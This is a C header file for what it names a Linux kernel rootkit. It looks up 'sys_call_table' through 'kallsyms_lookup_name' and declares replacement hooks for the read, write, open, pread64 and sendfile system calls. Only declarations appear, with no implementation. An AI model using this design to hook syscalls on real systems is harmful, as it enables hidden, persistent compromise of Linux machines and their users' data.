#ifndef _ROOTKIT_ROOTKIT_MAIN_H_
#define _ROOTKIT_ROOTKIT_MAIN_H_

#include <asm/ptrace.h>
#include <linux/linkage.h>

#define KALLSYMS_NAME "kallsyms_lookup_name"
#define SYS_CALL_TABLE_NAME "sys_call_table"

typedef void *(*kallsyms_t)(const char *s_name);
typedef asmlinkage long (*sysfun_t)(struct pt_regs *p_regs);

asmlinkage long new_read(struct pt_regs *p_regs);
asmlinkage long new_write(struct pt_regs *p_regs);
asmlinkage long new_open(struct pt_regs *p_regs);
asmlinkage long new_pread64(struct pt_regs *p_regs);
asmlinkage long new_sendfile(struct pt_regs *p_regs);

#endif
